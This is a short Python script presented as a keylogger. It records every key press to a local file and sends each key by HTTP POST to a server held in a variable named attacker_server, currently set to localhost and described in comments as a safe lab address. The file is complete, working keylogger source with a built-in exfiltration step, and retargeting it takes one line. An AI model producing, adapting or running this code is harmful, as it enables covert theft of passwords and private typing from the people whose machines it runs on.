#!/usr/bin/env python3
import keyboard
import requests
import time

# Log file for local testing (adjust this path as needed)
log_file = "keystrokes.txt"

# Set this to your controlled lab server if needed
attacker_server = "http://127.0.0.1:5000"  # Example safe test address

def log_to_file(key):
    with open(log_file, "a") as f:
        f.write(f"{key.name} ")

def send_to_server(key):
    try:
        data = {'key': key.name}
        requests.post(attacker_server + "/receive_data", data=data)
    except Exception as e:
        print(f"Error sending to server: {e}")

def main():
    print("Starting keylogger... Press ESC to stop.")
    keyboard.on_press(log_to_file)
    keyboard.on_press(send_to_server)

    # Wait until ESC is pressed
    keyboard.wait("esc")
    print("Keylogger stopped.")

if __name__ == "__main__":
    main()
